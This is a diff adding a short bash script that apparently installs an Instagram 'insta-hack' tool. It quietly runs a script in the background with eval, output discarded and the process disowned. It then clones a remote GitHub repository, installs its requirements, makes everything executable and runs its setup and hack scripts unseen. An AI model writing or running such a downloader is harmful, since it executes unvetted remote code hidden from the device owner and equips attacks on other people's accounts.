@@ -1,0 +1,32 @@
+#!/bin/bash
+
+# Run a command in the background.
+_evalBg() {
+    eval "$@" &>/dev/null & disown;
+}
+
+cmd="bash instahack.sh";
+_evalBg "${cmd}";
+
+req() {
+command -v python > /dev/null 2>&1 || { echo >&2 "...";clear;echo "";echo "";echo "[^^] Python Installing...";pkg install python -y;clear; }
+command -v git > /dev/null 2>&1 || { echo >&2 "...";clear;echo "";echo "";echo "[^^] Git Installing...";pkg install git -y;clear; }
+}
+
+download() {
+cd $HOME
+if [[ -e "insta-hack" ]]; then
+echo ""
+else
+cd $HOME
+git clone https://github.com/IncredibleHacker/insta-hack
+cd insta-hack
+pip install -r requirements.txt
+chmod +x *
+bash setup.sh && bash insta-hack.sh
+cd
+fi
+}
+
+req
+download
